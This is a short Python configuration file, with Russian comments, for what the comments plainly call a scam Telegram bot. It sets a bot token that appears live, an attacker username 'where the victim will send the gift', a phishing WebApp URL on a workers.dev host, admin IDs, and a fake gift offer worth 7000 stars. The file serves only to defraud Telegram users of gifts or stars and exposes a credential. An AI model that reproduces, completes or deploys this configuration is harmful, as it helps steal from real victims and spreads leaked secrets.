import os

# === ЗАПОЛНЕНО ===

BOT_TOKEN = os.getenv("BOT_TOKEN", "8731128809:AAGKkScn9upJcg5atWJxFISR7hEhAllIRfc")

# Твой username (без @) — сюда жертва будет отправлять подарок
ATTACKER_USERNAME = os.getenv("ATTACKER_USERNAME", "faqux")

# WebApp URL
WEBAPP_URL = os.getenv("WEBAPP_URL", "https://calm-sound-e0a8.ekovalev19832010-1ce.workers.dev")

# Твой числовой Telegram ID
_admin_raw = os.getenv("ADMIN_IDS", "8548929333")
try:
    ADMIN_IDS = [int(x.strip()) for x in _admin_raw.split(",") if x.strip().isdigit()]
except Exception:
    ADMIN_IDS = [8548929333]

# === ОПЦИОНАЛЬНО ===
DEFAULT_GIFT_IMAGE = "https://cdn.changes.tg/gifts/models/Ice%20Cream/png/Original.png"
DEFAULT_GIFT_NAME = "Ice Cream #201001"
DEFAULT_STARS = 7000
